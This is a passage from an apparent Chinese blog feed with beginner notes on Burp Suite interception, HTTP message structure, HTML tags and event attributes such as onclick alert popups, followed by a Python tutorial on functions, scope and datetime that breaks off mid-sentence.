Listeners中Add一条或者Edit一条监听地址及端口，如本地的8080端口。注意监听的端口不能和本机已使用的端口冲突。</p><p>（2）配置拦截选项：Proxy–&gt;Options，设置拦截请求包，设置拦截返回包</p><p>（3）浏览器的代理地址设置：</p><p>火狐浏览器设置步骤：菜单–&gt;选项–&gt;高级–&gt;网络—&gt;设置</p><p>Edge浏览器的设置步骤：在谷歌应用商店下载SwitchyOmega插件，在proxy情景模式下配置代理服务器，并保存</p><p>（4）请求与响应拦截：打开浏览器，输入访问的网址–&gt;设置浏览器代理–&gt;打开burpsuite，开启Intercept，在浏览器的hackbar中点击Execute–&gt;获取burpsuite抓取http报文–&gt;点击Forward提交、发送，会将访问的页面显示在浏览器上。</p><p>（5）数据报重放：抓取http的数据包后。右键单击——发送到Repeater–&gt;点击Repeater模块，在该模块能够显示请求包和回复包–&gt;在Request请求包里可以修改内容，点击Go之后，可以在Response回复包内容中显示返回在浏览器上的内容。</p><h3 id="HTTP请求报文"><a href="#HTTP请求报文" class="headerlink" title="HTTP请求报文"></a>HTTP请求报文</h3><p>HTTP请求由三部分组成：请求行、消息报头、请求正文</p><h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>包括http请求的种类/方法、请求资源的路径、http协议版本三个部分，以空格(%20)分隔，以回车换行符结尾(%0d%0a)。</p><pre><code class="Python">POST /search.php?searchsubmit=yes HTTP/1.1#POST为常见请求的种类/方法，定义了服务器收到请求后的“动作”#/search.php?searchsubmit=yes为请求资源的路径#HTTP/1.1是协议版本，目前默认为1.1</code></pre><table><thead><tr><th align="center">请求方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">GET</td><td align="center">请求指定的页面信息，并返回实体主体。</td></tr><tr><td align="center">POST</td><td align="center">向指定资源提交数据进行请求(例如提交表单或者上传文件)。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</td></tr></tbody></table><p>（3）说明：出于安全考虑，通常要求服务器只允许使用GET和POST方法。</p><p>二者区别：GET请求的所提交的所有数据都在URL中体现，不利于提交复杂的数据，且安全性相对较低，而POST请求可以将主要数据放在请求正文中提交，常用于提交复杂数据或敏感信息。</p><h4 id="URL简介"><a href="#URL简介" class="headerlink" title="URL简介"></a>URL简介</h4><p>（1）URL又称统一资源定位符是对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的URL，它包含的信息指出文件的位置及浏览器应该怎么处理它。</p><p>（2）URL的基本构成：</p><p>schema://host[:port#]/path/…/[;url-params][?query-string][#anchor]</p><pre><code>http://www.domain.com:1234/path/to/resource?a=b&amp;x=y#http为协议(protocol)#www.domain.com为host，1234为端口#/path/to/resource为资源路径#?a=b&amp;x=y为对资源的查询操作(query)</code></pre><p>（3）URL编码是一种浏览器用来打包表单输入的格式。浏览器从表单中获取所有的name和其中的值，将他们以name/value参数编码作为URL的一部分或者分离地发送给服务器，url编码就是一个字符ASCII码的十六进制，然后在其前面部分加上”%”</p><h4 id="消息报头"><a href="#消息报头" class="headerlink" title="消息报头"></a>消息报头</h4><p>（1）请求消息报头说明了客户端的基本信息，以及如何与客户端进行交互；</p><p>（2）消息报头由多行组成，每行以key:value的形式体现，每行末尾包括一个回车换行符(%0a%0d)，消息报头末尾以两个回车换行符作为结束。</p><table><thead><tr><th align="center">Header</th><th align="center">解释</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">Accept-Language</td><td align="center">浏览器可以接受的语言</td><td align="center">Accept-Language:en,zh</td></tr><tr><td align="center">Cookie</td><td align="center">HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器</td><td align="center">Cookie:Version=1;Skin=new;</td></tr><tr><td align="center">Content-Length</td><td align="center">请求的内容长度</td><td align="center">Content-Length:348</td></tr><tr><td align="center">Content-Type</td><td align="center">请求的内容对应的MIME信息</td><td align="center">Content-Type:application/x-www-form-urlencoded</td></tr><tr><td align="center">Host</td><td align="center">指定请求的服务器的域名和端口号(必选)</td><td align="center">Host:<a href="http://www.doone.com/">www.doone.com</a></td></tr><tr><td align="center">Referer</td><td align="center">表示当前是从哪个页面上的链接触发的</td><td align="center">Referer:<a href="http://www.zcmhi.com/archives/71.html">http://www.zcmhi.com/archives/71.html</a></td></tr><tr><td align="center">User-Agent</td><td align="center">User-Agent的内容包含发出请求的用户信息</td><td align="center">User-Agent:Mozilla/5.0(Linux;X11)</td></tr><tr><td align="center">X-Forwarded-For        client-ip</td><td align="center">用户通过代理服务器访问网站时代理服务器会自动添加该字段用于标记用户的真实IP</td><td align="center">X-Forwarded-For:1.1.1.1             client-ip:2.2.2.2</td></tr></tbody></table><h3 id="HTTP响应报文"><a href="#HTTP响应报文" class="headerlink" title="HTTP响应报文"></a>HTTP响应报文</h3><p>HTTP响应也由三部分组成，分别是：状态行、消息报头、响应正文</p><h4 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h4><p>（1）状态行包括http协议版本、状态码、状态描述三个部分，以空格符(%20)分隔，以回车换行符结尾(%0d%0a)</p><p>（2）状态代码由三位数字组成，第一个数字定义了响应的类别，且有五种可能取值。</p><pre><code>1xx：指示信息--表示请求已接收，继续处理2xx：成功--表示请求已被成功接收、理解、接受3xx：重定向--要完成请求必须进行更进一步的操作4xx：客户端错误--请求有语法错误或请求无法实现5xx：服务器端错误--服务器未能实现合法的请求</code></pre><p><img src="https://i.loli.net/2020/12/16/RBwkMDiAU8l1Pus.png" alt="image-20201216191016982"></p><h4 id="消息报头-1"><a href="#消息报头-1" class="headerlink" title="消息报头"></a>消息报头</h4><p>（1）消息报头说明了服务端的基本信息、客户端如何处理返回的消息等</p><p>（2）消息报头由多行组成，每行以key:value的形式体现，每行末尾包括一个回车换行符(%0a%0d)，消息报头末尾以两个回车换行符(%0a%0d)作为结束。</p><table><thead><tr><th align="center">Header</th><th align="center">解释</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">Allow</td><td align="center">服务器支持的请求方法，OPTIONS请求方法的响应头</td><td align="center">Allow:GET,HEAD,POST,OPTIONS</td></tr><tr><td align="center">Content-Encoding</td><td align="center">web服务器表明自己使用了什么压缩方法(gzip，deflate)压缩响应正文的内容</td><td align="center">Content-Encoding:gzip</td></tr><tr><td align="center">Content-Length</td><td align="center">响应正文的长度，以字节方式存储的十进制数字来表示</td><td align="center">Content-Length:42</td></tr><tr><td align="center">Content-Type</td><td align="center">响应正文的MIME类型和字符集</td><td align="center">Content-Type:text/html;charset=GB2312</td></tr><tr><td align="center">Location</td><td align="center">用于重定向一个新的位置，包含新的URL地址，表示客户应当到哪里去提取文档</td><td align="center">Location:<a href="http://www.baidu.com/search/error.html">http://www.baidu.com/search/error.html</a></td></tr><tr><td align="center">Server</td><td align="center">指明HTTP服务器用来处理请求的软件信息</td><td align="center">Server:nginx/1.5.4</td></tr><tr><td align="center">Set-Cookie</td><td align="center">用于把cookie发送到客户端浏览器，每一个写入cookie都会生成一个Set-Cookie</td><td align="center">Set-Cookie:sc=4c31523a;path=/;domain=.doone.com.con</td></tr><tr><td align="center">X-Powered-By</td><td align="center">表示网站使用什么技术开发的</td><td align="center">X-Powered-By:ASP.NET</td></tr></tbody></table><h2 id="HTML基本概念"><a href="#HTML基本概念" class="headerlink" title="HTML基本概念"></a>HTML基本概念</h2><p>（1）HTML是用来描述网页的一种语言</p><p>（2）HTML指的是超文本标记语言(Hyper Text Markup Language)</p><p>（3）HTML不是一种编程语言，而是一种标记语言，标记语言是一套标记标签</p><p>（4）HTML使用标记标签来描述网页</p><p>（5）HTML文档通常用htm和html作为后缀名</p><p>（6）Web浏览器的作用是读取HTML文档，并以网页的形式显示出他们。浏览器不会显示HTML标签，而是使用标签来解释页面的内容。</p><h3 id="HTML基础语法"><a href="#HTML基础语法" class="headerlink" title="HTML基础语法"></a>HTML基础语法</h3><p>（1）HTML文档是由HTML元素定义的，HTML元素以开始标签(start tag)起始，以结束标签(end tag)终止</p><p>（2）元素的内容是开始标签与结束标签之间的内容</p><p>（3）某些HTML元素内容为空，空元素在开始标签中闭合，无结束标签</p><p>（4）大多数HTML元素可拥有属性，属性总是以名称/值对的形式出现，提供了有关HTML元素的更多信息。</p><p>属性总是在HTML元素的开始标签中规定；</p><p>属性值应该始终被包括在引号内，双引号是最常用的，不过使用单引号也没问题。</p><p>（5）有时候没有结束标签元素也可以正常显示，但是可能会出现意外错误，不建议使用</p><p><img src="https://i.loli.net/2020/12/16/ahLjpODg9TUnw6I.png" alt="image-20201216201051807"></p><h3 id="HTML文档结构"><a href="#HTML文档结构" class="headerlink" title="HTML文档结构"></a>HTML文档结构</h3><p><img src="https://i.loli.net/2020/12/16/Zkn2LoxrgEuS4wB.png" alt="image-20201216204841476"></p><pre><code class="html">&lt;!DOCTYPE html/&gt;&lt;html&gt;    &lt;head&gt;                            #&lt;head&gt;通常不显示        &lt;/head&gt;        &lt;meta charest=&quot;utf-8&quot;/&gt;       #主体的编码方式        &lt;title&gt;文档的标题&lt;/title&gt;           &lt;/head&gt;    &lt;body&gt;                           #body元素定义文档的主体    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/17/LEjQBNGDzkldbgs.png" alt="image-20201217211426549"></p><h3 id="HTML常见标签"><a href="#HTML常见标签" class="headerlink" title="HTML常见标签"></a>HTML常见标签</h3><p>（1）格式标签：&lt;h1&gt; to &lt;h6&gt;定义HTML标题。  &lt;br/&gt;定义换行</p><p>（2）链接标签：&lt;a&gt;定义超链接</p><p>（3）文本标签：&lt;input&gt;定义文本域</p><p>（4）多媒体标签：&lt;img&gt;定义图像</p><p>（5）&lt;body&gt;元素定义了HTML文档的主体</p><p>（6）&lt;html&gt;元素定义了整个HTML文档</p><h4 id="格式标签"><a href="#格式标签" class="headerlink" title="格式标签"></a>格式标签</h4><p>（1）&lt;h1&gt;标签可定义标题。&lt;h1&gt;定义最大的标题，&lt;h6&gt;定义最小的标题</p><p>（2）示例：</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;h1&gt;            这是标题1        &lt;/h1&gt;        &lt;h2&gt;            这是标题2        &lt;/h2&gt;        &lt;h3&gt;            这是标题3        &lt;/h3&gt;        &lt;h4&gt;            这是标题4        &lt;/h4&gt;        &lt;h5&gt;            这是标题5        &lt;/h5&gt;        &lt;h6&gt;            这是标题6        &lt;/h6&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/7mebkXYvxLt1SKu.png" alt="image-20201216205838653"></p><h4 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h4><p>（1）&lt;a&gt;标签定义超链接，用于从一个页面链接到另一个页面</p><p>（2）&lt;a&gt;元素最重要的属性是href属性，它指示链接的目标</p><p>（3）示例：</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;a href= &quot;http://www.goktech.cn&quot; &gt;国科科技&lt;/a&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/dKCGo7iguY362Ua.png" alt="image-20201216210422270"></p><p><img src="https://i.loli.net/2020/12/16/ShCtUew8pV9I63k.png" alt="image-20201216210440769"></p><h4 id="文本域"><a href="#文本域" class="headerlink" title="文本域"></a>文本域</h4><p>（1）&lt;input&gt;标签用于搜集用户信息。根据不同的type属性值，输入字段拥有很多种形式。</p><p>（2）输入字段可以是文本字段、复选框、掩码后的文本控件、单选按钮、按钮等等。</p><p>（3）示例：</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            First name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;/&gt;&lt;br&gt;            Last name: &lt;input type= &quot;text&quot; name=&quot;Iname&quot;/&gt;&lt;br&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/xKhX7fDPcCsFkuv.png" alt="image-20201216211427660"></p><h4 id="图像标签"><a href="#图像标签" class="headerlink" title="图像标签"></a>图像标签</h4><p>（1）&lt;img&gt;标签向网页中嵌入一幅图像</p><p>（2）&lt;img&gt;标签有两个必需的属性：src属性和alt属性</p><p>（3）示例：</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;img src=&quot;http://www.goktech.cn/img/img_index/logo2.png&quot;/&gt;        &lt;br/&gt;        &lt;br&gt;        &lt;img src=&quot;/html/images/eg_tulip.jpg&quot;&gt;&lt;br/&gt;        &lt;br&gt;        &lt;br&gt;        &lt;img src=&quot;/images/1.jpg&quot; alt=&quot;玫瑰花&quot;&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/lP7hgsCdaKpWbQo.png" alt="image-20201216213448240"></p><p>若无法显示图像，浏览器将显示替代文本</p><p><img src="https://i.loli.net/2020/12/16/pFnAySDEhsPUoHg.png" alt="image-20201216213511013"></p><h3 id="事件属性与Windos对象方法"><a href="#事件属性与Windos对象方法" class="headerlink" title="事件属性与Windos对象方法"></a>事件属性与Windos对象方法</h3><p>（1）HTML事件属性是一种特殊的属性，提供了事件在浏览器中触发动作的能力，比如当用户点击元素时启动JavaScript</p><p>（2）Window对象方法提供了一些简单的动作，如弹出对话框的能力，window对象方法与事件结合使用可以实现一些简单的交互功能。</p><p>（3）基本用法：</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;input type=&quot;text&quot; onclick=&quot;alert(&#39;您好，请输入&#39;)&quot; /&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/PViqu2ErGCteTg4.png" alt="image-20201216220517460"></p><h3 id="常见事件属性与windows对象方法"><a href="#常见事件属性与windows对象方法" class="headerlink" title="常见事件属性与windows对象方法"></a>常见事件属性与windows对象方法</h3><p><strong>常见事件属性</strong></p><p>（1）鼠标事件：</p><pre><code>Onclick;元素上发生鼠标点击时触发。Ondblclick：元素上发生鼠标双击时触发0nmouseover：当鼠标指针移动到元素上时触发onmouseout：当鼠标指针移除元素时触发</code></pre><p>（2）键盘事件：</p><pre><code>Onkeydown：当用户按下按键时触发</code></pre><p>（3）Form事件：</p><pre><code>Onchange:在元素值被改变时触发Onfocus：当元素获得焦点时触发</code></pre><p><strong>常见对象方法</strong></p><p>（1）alert():显示带有一段消息和一个确认按钮的警告框</p><p>（2）confirm():显示带有一段消息以及确认按钮和取消按钮的对话框</p><p>（3）prompt():显示可提示用户输入的对话框</p><h3 id="事件属性与windows对象方法实例"><a href="#事件属性与windows对象方法实例" class="headerlink" title="事件属性与windows对象方法实例"></a>事件属性与windows对象方法实例</h3><p>(1)onmouseover属性在鼠标指针移动到元素上时触发。当用户把鼠标移动到图片上时，会显示可提示用户输入的对话框。</p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;img onmouseover=&quot;prompt()&quot; src=&quot;/images/eg_chinarose.jap&quot;&gt;    &lt;/head&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/NPQ7xscjLnp43mr.png" alt="image-20201216223834282"></p><p>（2）onchange属性在元素值被改变时触发</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        请输入您的姓名：        &lt;input type=&quot;text&quot; onchange=&quot;confirm(&#39;Good Good study,Day Day up!&#39;)&quot; /&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>当在输入框输入姓名回车后，会弹出信息的提示框</p><p><img src="https://i.loli.net/2020/12/16/dESxU2gyarJhoXF.png" alt="image-20201216224229033"></p><h3 id="HTML标签嵌套"><a href="#HTML标签嵌套" class="headerlink" title="HTML标签嵌套"></a>HTML标签嵌套</h3><p>（1)HTML标签通常都是互相嵌套的，通过相互嵌套标签可以实现各类复杂的效果。</p><p>（2）例如：将IMG标签嵌套至A标签的内容位置，可以使得图片变成一个可点击的链接。</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;a href=http://www.baidu.com&gt;            &lt;img src=&quot;https://www.baidu.com/img/bd_logo1.png&quot; alt=&quot;baidu&quot; width=&quot;100&quot; height=&quot;42&quot;&gt;        &lt;/a&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/BlAofEQndb8RYmL.png" alt="image-20201216235827081"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(五)</title>
      <link href="2020/12/14/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A801/"/>
      <url>2020/12/14/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A801/</url>
      
        <content type="html"><![CDATA[<h2 id="函数的基本使用"><a href="#函数的基本使用" class="headerlink" title="函数的基本使用"></a>函数的基本使用</h2><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><p>（1）函数是一段具有特定功能的、可重用的语句组，用函数名来表示并通过函数名进行功能调用。函数可以在一个程序中的多个位置使用，也可以用于多个程序。函数可以是自己编写的，称为自定义函数；也可以是Python内置的函数。</p><p>（2）Python使用def保留字定义了一个函数，语法形式如下：</p><pre><code class="Python">def &lt;函数名&gt;(&lt;参数列表&gt;):    &lt;函数体&gt;    return &lt;返回值列表&gt;&#39;&#39;&#39;函数名可以是任何有效的Python标识符；参数列表是调用该函数时传递给它的值，可以有0个或多个，传递多个参数时用逗号分隔，这里的参数是形式参数，简称&quot;形参&quot;；函数体是函数每次被调用时执行的代码；当需要返回值时，使用保留字return和返回值列表，否则可以没有return语句&#39;&#39;&#39;</code></pre><p>（3）函数调用和执行的一般形式:&lt;函数名&gt;(&lt;参数列表&gt;)。此时，参数列表中给出要传入函数内部的参数，这类参数称为实际参数，简称“实参”。实例：生日歌</p><pre><code class="python">def happy():    print(&quot;Happy birthday to you!&quot;)def happyB(name):    happy()    happy()    print(&quot;Happy birthday, dear &#123;&#125;!&quot;.format(name))    happy()happyB(&quot;Mike&quot;)print()happyB(&quot;Lily&quot;)</code></pre><h3 id="函数的调用过程"><a href="#函数的调用过程" class="headerlink" title="函数的调用过程"></a>函数的调用过程</h3><p>（1）函数调用步骤：调用程序在调用处暂停执行–&gt;在调用时将实参复制给函数的形参–&gt;执行函数体语句–&gt;函数调用结束给出返回值，程序回到调用前的暂停处继续执行。</p><p>（2）由于函数只有在被调用时才执行，因此，上面的实例中，前7行代码不直接执行。程序最先执行的语句是第8行的happyB(“Mike”)。</p><h3 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h3><p>（1）lambda保留字用于定义一种特殊的函数——匿名函数，又叫lambda函数。</p><p>（2）匿名函数并非没有名字，而是将表达式作为函数结果返回，语法格式如下：</p><pre><code class="Python">&lt;函数名&gt; = lambda &lt;参数列表&gt;： &lt;表达式&gt;等价于：def &lt;函数名&gt;(&lt;参数列表&gt;)：    return &lt;表达式&gt;</code></pre><p>（3）实例：</p><pre><code class="python">&gt;&gt;&gt; f = lambda x, y : x + y&gt;&gt;&gt; type(f)&lt;class &#39;function&#39;&gt;&gt;&gt;&gt; f(10,12)22</code></pre><h2 id="函数的参数传递"><a href="#函数的参数传递" class="headerlink" title="函数的参数传递"></a>函数的参数传递</h2><p><strong>要点：函数可以定义可选参数，使用参数的位置或名称传递参数值，根据函数中变量的不同作用域有不同的函数返回值方式</strong></p><h3 id="可选参数和可变数量参数"><a href="#可选参数和可变数量参数" class="headerlink" title="可选参数和可变数量参数"></a>可选参数和可变数量参数</h3><p>（1）在定义函数时，如果有些参数存在默认值，可以直接为这些参数指定默认值。当函数被调用时，如果没有传入对应的参数值，则使用函数定义时的默认值替代。例如：</p><pre><code class="python">&gt;&gt;&gt; def dup(str, times = 2):    print(str*times)&gt;&gt;&gt; dup(&quot;knock!&quot;)knock!knock!&gt;&gt;&gt; dup(&quot;knock!&quot;,4)knock!knock!knock!knock!</code></pre><p>（2）由于函数调用时需要按顺序输入参数，可选参数必须定义在非可选参数的后面，即dup()函数中默认值的可选参数times必须定义在str参数后面。</p><p>（3）函数在定义的时，也可以设计可变数量参数，通过在参数前增加星号(*)实现。带有星号的可变参数只能出现在参数列表的最后。调用时，这些参数被当做元组类型传递到函数中。</p><pre><code class="python">&gt;&gt;&gt; def vfunc(a, *b):    print(type(b))    for n in b:        a+=n    return a&gt;&gt;&gt; vfunc(1,2,3,4,5)&lt;class &#39;tuple&#39;&gt;15</code></pre><p>（4）上例中vfunc()函数定义了可变参数b，调用vfunc()函数时输入的(2,3,4,5)被当做元祖传递给b，与a累加后输出，这里可以将元祖理解为一组元素。</p><h3 id="参数的位置和名称传递"><a href="#参数的位置和名称传递" class="headerlink" title="参数的位置和名称传递"></a>参数的位置和名称传递</h3><p>（1）函数调用时，实参默认采用按照位置顺序的方式传递给函数，例如dup(“knock!”,4)中第一个实参默认赋值给形参str，第二个实参赋值给形参times。但当参数很多时，这种调用参数的方式可读性较差。例如：</p><pre><code class="python">#假设func()函数有6个参数，它的定义如下，其中参数分别表示两组三维坐标值&gt;&gt;&gt;def func(x1,y1,z1,x2,y2,z2):    retrun#它的一个实际调用如下：&gt;&gt;&gt;result = func(1,2,3,4,5,6)</code></pre><p>（2）若仅看实际调用而不看函数定义，很难理解这些输入参数的意义。在大规模的程序中，函数定义可能在函数库中，也可能与调用相距很远，带来的可读性较差。</p><p>（3）为解决上述问题，Python提供了按照形参名称输入实参的方式，此时函数调用如下：</p><pre><code class="python">&gt;&gt;&gt;result = func(x1=1,y1=2,z1=3,x2=4,y2=5,z2=6)#也可如下方式调用：&gt;&gt;&gt;result = func(x2=4,y2=5,z2=6,x1=1,y1=2,z1=3)</code></pre><p>（4）由于调用函数时指定了参数名称，所以参数之间的顺序可以任意调整。</p><h3 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h3><p>（1）return语句用来退出函数并将程序返回到函数被调用的位置继续执行。return语句可以同时将0个、1个或多个函数运算后的结果返回给函数被调用处的变量，</p><pre><code class="Python">&gt;&gt;&gt;def func(a,b):    retrun a*b&gt;&gt;&gt;s = func(&quot;knock!&quot;,2)&gt;&gt;&gt;print(s)knock!knock!</code></pre><p>（2）函数可以没有return，此时函数并不返回值，如实例“生日歌”的happy()函数。函数也可以用return返回多个值，多个值以元祖类型保存，例如：</p><pre><code class="python">&gt;&gt;&gt; def func(a,b):    return b, a&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)&gt;&gt;&gt; print(s,type(s))(2, &#39;knock!&#39;) &lt;class &#39;tuple&#39;&gt;</code></pre><h3 id="函数对变量的作用"><a href="#函数对变量的作用" class="headerlink" title="函数对变量的作用"></a>函数对变量的作用</h3><p>（1）一个程序中的变量包括两类：全局变量和局部变量。全局变量指在函数之外定义的变量，一般没有缩进，在程序执行全过程有效。局部变量是指在函数内部使用的变量，仅在函数内部有效，当函数退出时变量将不存在。例如：</p><pre><code class="python">&gt;&gt;&gt; n = 1         #n是全局变量&gt;&gt;&gt; def func(a, b):    c = a * b     #c是局部变量，a和b作为函数参数也是局部变量    return c&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)&gt;&gt;&gt; print(c)Traceback (most recent call last):  File &quot;&lt;pyshell#14&gt;&quot;, line 1, in &lt;module&gt;    print(c)NameError: name &#39;c&#39; is not defined   #当函数执行完退出后，其内部变量将被释放&gt;&gt;&gt; def fun(a, b):    n = b         #这个n是在函数内部新生成的局部变量，不是全局变量    return a*b&gt;&gt;&gt; s = fun(&quot;knock!&quot;,2)&gt;&gt;&gt; print(s,n)    #测试一下n的值是否改变knock!knock! 1</code></pre><p>（2）函数fun()内部使用了变量n，并且将变量参数b赋值给变量n，但n的值并没有改变，因为函数fun()有自己的内存空间，它将n=b语句理解为生成一个局部变量n，并将参数b赋值给它，此时fun()函数没有将n当做全局变量。所以，函数退出后，局部变量n被释放，全局变量n的值没有改变。</p><p>（3）若希望让fun()函数将n当做全局变量，则需要在变量n使用前显式声明该变量为全局变量，代码如下：</p><pre><code class="python">&gt;&gt;&gt; n = 1&gt;&gt;&gt; def fun(a, b):    global n      #引入全局变量    n = b         #将局部变量b赋值给全局变量n    return a*b&gt;&gt;&gt; s = fun(&quot;knock!&quot;,2)&gt;&gt;&gt; print(s,n)    #测试一下n的值是否改变knock!knock! 2</code></pre><p>（4）当全局变量不是整数n，而是列表类型ls时，全局列表变量会在函数的调用后发生改变。代码如下：</p><pre><code class="python">&gt;&gt;&gt; ls = []       #ls是全局列表变量&gt;&gt;&gt; def func(a,b):    ls.append(b)  #将局部变量b增加到全局列表变量ls中    return a*b&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)&gt;&gt;&gt; print(s,ls)knock!knock! [2]</code></pre><p>（5）列表等组合数据类型由于操作多个数据，所以他们在使用中有创建和引用的分别。当列表变量被方括号([]，无论是否为空)赋值时，这个列表才被真实创建，否则只是对之前创建列表的一次引用。</p><p>（6）上述代码func()函数的ls.append(b)语句执行时需要一个真实创建过的列表，此时func()函数专属的内存空间中没有已经创建过且名称为ls的列表，因此，func()函数进一步去寻找全局内存空间，自动关联全局ls列表，并修改其内容。当func()函数退出后，全局ls列表中的内容被修改。也就是说，<strong>对于列表类型，函数可以直接使用全局列表而不需要采用global进行声明。</strong></p><p>（7）若func()函数内部存在一个真实创建过且名称为ls的列表，则func()函数将操作该列表而不会修改全局变量。例如：</p><pre><code class="python">&gt;&gt;&gt; ls = []        #ls是全局列表变量&gt;&gt;&gt; def func(a,b):    ls = []        #创建了名称为ls的局部列表变量列    ls.append(b)   #将局部变量b增加到局部列表变量ls中    return a*b&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)&gt;&gt;&gt; print(s,ls)    #测试ls的值是否被改变knock!knock! []</code></pre><p><strong>总结，Python函数对变量的作用遵守如下原则。</strong></p><ul><li>简单数据类型变量无论是否与全局变量重名，仅在函数内部创建和使用，函数退出后变量被释放，如有全局同名变量，其值不变。</li><li>简单数据类型变量在用global保留字声明后，作为全局变量使用，函数退出后该变量保留且值被函数改变。</li><li>对于组合数据类型的全局变量，如果在函数内部没有被真实创建的同名变量，则函数内部可以直接使用并修改全局变量的值。</li><li>如果函数内部真实创建了组合数据类型变量，无论是否有同名全局变量，函数仅对局部变量进行操作，函数退出后局部变量被释放，全局变量值不变。</li></ul><p><strong>扩展：指针和引用</strong></p><p>（1）指针是保存地址的变量，一般出现在比较底层的程序设计语言中，如C语言。引用是某一变量的别名，用这个名字可以对变量进行操作，如Python列表类型的引用。</p><p>（2）二者的主要区别是，指针直接指向内存地址，说明对象已经生成，而引用只是别名，需要真实创建对象才能操作对象。</p><h2 id="datetime库的使用"><a href="#datetime库的使用" class="headerlink" title="datetime库的使用"></a>datetime库的使用</h2><p>要点：<strong>Python时间处理的标准函数库datetime提供了一批显示日期和时间的格式化方法。</strong></p><h3 id="datetime库概述"><a href="#datetime库概述" class="headerlink" title="datetime库概述"></a>datetime库概述</h3><p>（1）datetime库可以从系统中获得时间，并以用户选择的格式输出。datetime库以格林威治时间为基础，每天由3600*24秒精确定义。该库包括两个常量：datetime.MINYEAR和datetime.MAXYEAR，分别表示datetime所能表示的最小、最大年份，值分别为1与9999.</p><p>（2）datetime库以类的方式提供多种日期和时间表达方式。</p><ul><li>datetime.date：日期表示类，可以表示年、月、日等。</li><li>datetime.time：时间表示类，可以表示小时、分钟、秒、毫秒等。</li><li>datetime.datetime：日期和时间表示的类，功能覆盖date和time类。</li><li>datetime.timedelta：与时间间隔有关的类。</li><li>datetime.tzinfo：与时区有关的信息表示类。</li></ul><p>（3）以上表达方式中，datetime.datetime类表达形式最为丰富。使用datetime类需要用import保留字，引用datetime类的方式如下：</p><pre><code class="python">from datetime import datetime</code></pre><h3 id="datetime库解析"><a href="#datetime库解析" class="headerlink" title="datetime库解析"></a>datetime库解析</h3><p>（1）datetime类(datetime.datetime类)的使用方式是首先创建一个datetime对象，然后通过对象的方法和属性显示时间。创建datetime对象有三种方法：datetime.now()、datetime.utcnow()和datetime.datetime()。</p><ul><li><p>使用datetime.now()获得当前日期和时间对象，使用方法如下：</p><p><strong>datetime.now()</strong></p><p>作用：返回一个datetime类型，表示当前的日期和时间，精确到微秒。</p><p>参数：无</p><p>调用该函数，执行结果如下：</p><pre><code class="python">&gt;&gt;&gt;from datetime import datetime&gt;&gt;&gt;today = datetime.now()&gt;&gt;&gt;todaydatetime.datetime(2021, 2, 10, 17, 34, 27, 70232)</code></pre></li><li><p>使用datetime.utcnow()获得当前日期和时间对应的UTC(世界标准时间)时间对象，使用方法如下：</p><p><strong>datetime.utcnow()</strong></p><p>作用：返回一个datetime类型，表示当前日期和时间的UTC表示，精确到微秒。</p><p>参数：无</p><p>调用该函数，执行结果如下：</p><pre><code class="python">&gt;&gt;&gt; today = datetime.utcnow()&gt;&gt;&gt; todaydatetime.datetime(2021, 2, 10, 9, 36, 43, 119372)</code></pre></li><li><p>datetime.now()和datetime.utcnow()都返回一个datetime类型的对象，也可以直接使用datetime()构造一个日期和时间对象，使用方法如下：</p><p><strong>datetime(year, month, day, hour=0, minute=0, second=0, microsecond=0)</strong></p><p>作用：返回一个datetime类型，表示指定的日期和时间，可以精确到微秒。</p><p>参数如下：</p><p>year：指定的年份，MINYEAR &lt;= year &lt;= MAXYEAR</p><p>month：指定的月份，1 